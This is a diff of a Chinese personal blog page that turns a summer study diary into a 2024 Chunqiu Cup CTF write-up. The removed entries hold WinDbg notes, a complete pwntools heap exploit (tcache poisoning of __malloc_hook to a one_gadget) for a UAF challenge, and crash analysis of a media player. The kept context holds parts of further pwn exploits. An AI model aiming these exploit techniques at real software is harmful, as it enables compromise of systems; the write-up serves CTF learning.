@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2024暑期学习记录, StarrySky">
+    <meta name="keywords" content="2024春秋杯夏季赛, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2024暑期学习记录 | StarrySky</title>
+    <title>2024春秋杯夏季赛 | StarrySky</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -231,7 +231,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2024暑期学习记录</h1>
+                    <h1 class="description center-align post-title">2024春秋杯夏季赛</h1>
                 </div>
             </div>
         </div>
@@ -351,6 +351,10 @@
                                 <span class="chip bg-color">pwn</span>
                             </a>
                         
+                            <a href="/tags/shellcode/">
+                                <span class="chip bg-color">shellcode</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -359,8 +363,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-category">
-                                学习记录
+                            <a href="/categories/WP/" class="post-category">
+                                WP
                             </a>
                         
                     </div>
@@ -372,7 +376,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-07-05
+                    2024-07-14
                 </div>
                 
 
@@ -381,14 +385,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    16 分
+                    7 分
                 </div>
                 
 
@@ -406,10 +410,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>复盘了一下这学期欠缺的待学习内容，简单列了个学习计划，写了这篇博客记录一下暑假学习历程，也是激励自己每天多学一点</p>
-<img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92.png" class>
-
-<h2 id="7-5"><a href="#7-5" class="headerlink" title="#7.5"></a>#7.5</h2><p>早上和晚上在打春秋杯夏季赛，下午被摇过去改论文，春秋杯打完就不打算打比赛啦，留时间把没完成的事完成一下，然后跟着学长一起复现</p>
+                <p>比赛打一半去学逆向啦， <code>awdp</code>的<code>pwn</code>没打</p>
 <h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：
 你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。
 （本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）
@@ -587,7 +588,6 @@ r<span class="token punctuation">.</span>sendlineafter<span class="token punctua
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="7-6"><a href="#7-6" class="headerlink" title="#7.6"></a>#7.6</h2><p>今天坐大牢，一个知识点没查到肝了半天，下午又被摇过去改申请书嘻嘻，晚上试图逆向分析复现一下比赛，<code>but</code>卡住了工具上，用<code>IDA</code>直接崩，<code>x64dbg</code>调到<code>crash</code>的位置了又换<code>windbg</code>，卡在软件下载和使用上了…都是代理惹的祸~</p>
 <h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little
    RELRO:    Partial RELRO
@@ -701,223 +701,6 @@ r<span class="token punctuation">.</span>send<span class="token punctuation">(</
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="7-7"><a href="#7-7" class="headerlink" title="#7.7"></a>#7.7</h2><p>今天有点摆烂了…欸，周末嘛（bushi），主要是前一天睡的有点晚，直接润去姐姐家睡到了下午（）。晚上摸索了一下<code>windbg</code>基本用法</p>
-<h3 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h3><p>打开文件：文件选项卡中打开exe文件</p>
-<p>设置符号路径  ： <code>.sympath srv*</code></p>
-<p>加载符号： <code>.reload</code></p>
-<p>运行：<code>g</code></p>
-<p>设置断点： <code>bp addr</code>  </p>
-<p>查看堆栈状态：<code>kb</code></p>
-<p>查看反汇编代码：<code>u addr</code></p>
-<p>查看内容内容：双字：<code>dd/dc addr</code></p>
-<p>​    Unicode 字符串 ：<code>du addr</code></p>
-<p>​    十六进制双字：<code>dD addr</code></p>
-<p>​    内存内容的指针：<code>dp addr</code></p>
-<p>​    字：<code>dw addr</code></p>
-<p>​    字节：<code>db addr</code></p>
-<p>​    ASCII字符：<code>da addr</code></p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dc 00400000
-00400000  00405000 00406000 00407000 00408000  <span class="token punctuation">.</span>P<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-00400010  00409000 0040A000 0040B000 0040C000  <span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-
-0:000> du 00400000
-00400000  <span class="token string">"Hello, world!"</span>
-00400010  <span class="token string">"This is a test string."</span>
-
-0:000> dd 00400000
-00400000  00405000 00406000 00407000 00408000
-00400010  00409000 0040A000 0040B000 0040C000
-
-0:000> db 00400000
-00400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello<span class="token punctuation">,</span> world!<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>查看寄存器：<code>r</code>	&#x2F;   <code>r register</code></p>
-<p>修改寄存器：<code>r register = value</code></p>
-<p>单步执行：不进入函数：<code>p</code></p>
-<p>​         进入函数：<code>t</code></p>
-<h2 id="7-8"><a href="#7-8" class="headerlink" title="#7.8"></a>#7.8</h2><p>今天还在捣鼓<code>windbg</code>，有点难绷…</p>
-<h3 id="windbg-1"><a href="#windbg-1" class="headerlink" title="windbg"></a>windbg</h3><p><code>windbg</code>作用和<code>pwndbg</code>类似，还需要结合<code>IDA</code>逆向分析</p>
-<p>显示指定的加载模块:<code>lm</code></p>
-<p>bp、bu 和 bm 命令设置新的断点，但它们具有不同的特征：</p>
-<p>●bp (设置断点) 命令在命令中指定的断点位置的地址处设置新的断点。 如果在设置断点时调试器无法解析断点位置的地址表达式，则 bp 断点将自动转换为 bu 断点。 使用 bp 命令创建在卸载模块时不再处于活动状态的断点</p>
-<p>●bu (设置未解析断点) 命令设置延迟或未解析的断点。 bu 断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 有关这些断点的详细信息</p>
-<p>●bm (设置符号断点) 命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后， bm 断点与 bu 断点相同。 也就是说， bm 断点是在符号引用上设置的延迟断点。 但是，bm &#x2F;d 命令会创建一个或多个 bp 断点。 每个断点在匹配位置的地址上设置，不跟踪模块状态</p>
-<p>●.bpcmds&#x2F;bl 查看断点情况</p>
-<pre class="line-numbers language-none"><code class="language-none">0:000&gt; bm myprogram!mem* 
-
-  4: 0040d070 MyProgram!memcpy
-
-  5: 0040c560 MyProgram!memmove
-
-  6: 00408960 MyProgram!memset
-
-0:000&gt; bp MyTest+0xb 7 	#前六次忽略此断点，第七次传递时，执行会停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7-9"><a href="#7-9" class="headerlink" title="#7.9"></a>#7.9</h2><p>早上被摇去写了个<code>uaf</code>，然后一直在装<code>FakePDB</code>，救命，装不动了</p>
-<h3 id="pwn题"><a href="#pwn题" class="headerlink" title="pwn题"></a>pwn题</h3><p><code>uaf</code>，限制15个堆，直接<code>tcachebin attack</code></p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>
-
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v1 <span class="token operator">=</span> <span class="token function">readint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOOOOOOO!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OKK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>exp如下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
-
-file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
-
-li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
-ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
-
-<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
-
-debug <span class="token operator">=</span> <span class="token number">0</span>
-<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span>
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
-
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>
-
-delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>
-malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
-one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
-ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
-
-add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>
-
-delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
-
-edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>
-
-edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7-10"><a href="#7-10" class="headerlink" title="#7.10"></a>#7.10</h2><p>安装<code>FakePDB</code>，发现有<code>release</code>版本，唉前一天白浪费那么多时间去编译啦，但是还是只能生成<code>json</code>，<code>pdb</code>还是没生成的起来。然后被老师摇去看论文啦，一万多字的专业性文章真是考验专注力和耐心，过程中和学长交流才发现，其实<code>kb</code>查看栈回溯里的内容就行</p>
-<h3 id="windbg-2"><a href="#windbg-2" class="headerlink" title="windbg"></a>windbg</h3><p>之前对<code>windbg</code>的误区是它既然不能识别函数那不就不能追溯到经过了哪些函数，昨天学到下断点是<code>module_name+address</code>，今天学长提到<code>kb</code>再去看了一下才发现这里的栈回溯就是<code>module_name+address</code>形式的代替了函数</p>
-<p>例如这里的<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>再去看<code>IDA</code>对应的就是<code>0x400000+0x6371de=0xA371DE</code>，即函数<code>_invoke_watson</code></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb
- <span class="token punctuation">\</span># ChildEBP RetAddr      Args to Child              
-WARNING: Stack unwind information not available. Following frames may be wrong.
-00 017eefc0 00e971cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de
-01 017eefe4 00a66a63     017ef0ec 00000104 05989178 GOM32Q_vc120_ReleaseQC+0x6371cc
-02 017ef338 00a4d040     0ada2b98 00000001 00d6723a GOM32Q_vc120_ReleaseQC+0x206a63
-03 017ef3fc 00d682e2     00ffb640 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x1ed040
-04 017ef41c 00d6392f     0000c322 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x5082e2
-05 017ef48c 00d640ea     0ad8e898 000408f4 0000c322 GOM32Q_vc120_ReleaseQC+0x50392f
-06 017ef4ac 771116eb     000408f4 0000c322 0ada2b98 GOM32Q_vc120_ReleaseQC+0x5040ea
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>追溯到最后一个函数如下</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">_invoke_watson</span><span class="token punctuation">(</span>
-	<span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span>
-	<span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span>
-	<span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span>
-	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span>
-	<span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">IsProcessorFeaturePresent</span><span class="token punctuation">(</span><span class="token number">0x17u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
-		<span class="token function">__fastfail</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">_call_reportfault</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1073740777</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">__crtTerminateProcess</span><span class="token punctuation">(</span><span class="token number">0xC0000417</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7-11"><a href="#7-11" class="headerlink" title="#7.11"></a>#7.11</h2><p>今天彻底明白怎么用<code>windbg</code>结合<code>IDA</code>调试啦，不容易，具体内容见另一篇博客吧。对<code>GOM</code>进行了一些逆向，然后又被摇去看论文了嘶，什么时候我能看得懂这个论文在写什么呢（逃</p>
-<h3 id="GOM逆向"><a href="#GOM逆向" class="headerlink" title="GOM逆向"></a>GOM逆向</h3><p><code>kb</code>查看栈回溯找到的第一个函数，是触发<code>crash</code>时的反调试</p>
-<p>再往上追溯两个函数</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">_invalid_parameter</span><span class="token punctuation">(</span>
-<span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span>
-<span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span>
-<span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span>
-<span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span>
-<span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eax</span>
-v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">DecodePointer</span><span class="token punctuation">(</span>dword_CE8C44<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span>
-  <span class="token function">_invoke_watson</span><span class="token punctuation">(</span>Expression<span class="token punctuation">,</span> FunctionName<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> LineNo<span class="token punctuation">,</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token function">v5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">_invalid_parameter_noinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-<span class="token function">_invalid_parameter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>再往上追溯一个函数就是漏洞点sub_606910中的sub_5CE090(this[61], v14);，漏洞点就在wcscpy_s(Destination, 0x104u, Source);</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">sub_606910</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token operator">*</span>this<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">116</span> <span class="token punctuation">)</span>
-	<span class="token keyword">goto</span> LABEL_25<span class="token punctuation">;</span>
-	<span class="token function">sub_44A540</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v12 <span class="token operator">-</span> <span class="token number">116</span> <span class="token operator">+</span> <span class="token number">144</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">LOBYTE</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
-	<span class="token function">wcscpy_s</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token number">0x104u</span><span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">sub_5CE090</span><span class="token punctuation">(</span>this<span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7-12"><a href="#7-12" class="headerlink" title="#7.12"></a>#7.12</h2><p>早上改说明书摘要，下午和代理沟通，逆向一会和妈妈小姨去逛超市吃海底捞，回去又逆向了一会。唉海底捞真的快吃腻啦</p>
